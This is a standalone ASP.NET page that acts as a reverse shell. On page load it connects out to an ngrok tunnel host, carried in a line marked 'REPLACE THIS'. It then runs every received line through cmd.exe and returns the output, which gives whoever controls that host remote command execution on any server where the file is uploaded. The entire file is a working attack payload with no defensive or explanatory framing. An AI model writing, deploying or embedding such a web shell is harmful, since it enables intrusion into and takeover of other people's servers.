<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            using (TcpClient client = new TcpClient("tcp://0.tcp.ngrok.io", 12239)) // <-- REPLACE THIS
            using (Stream stream = client.GetStream())
            using (StreamReader reader = new StreamReader(stream))
            using (StreamWriter writer = new StreamWriter(stream))
            {
                writer.AutoFlush = true;
                string input;
                while ((input = reader.ReadLine()) != null)
                {
                    Process proc = new Process();
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.Arguments = "/c " + input;
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.RedirectStandardError = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true;
                    proc.Start();

                    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
                    writer.WriteLine(output);
                }
            }
        }
        catch (Exception ex)
        {
            Response.Write("<pre>ERR: " + Server.HtmlEncode(ex.ToString()) + "</pre>");
        }
    }
</script>
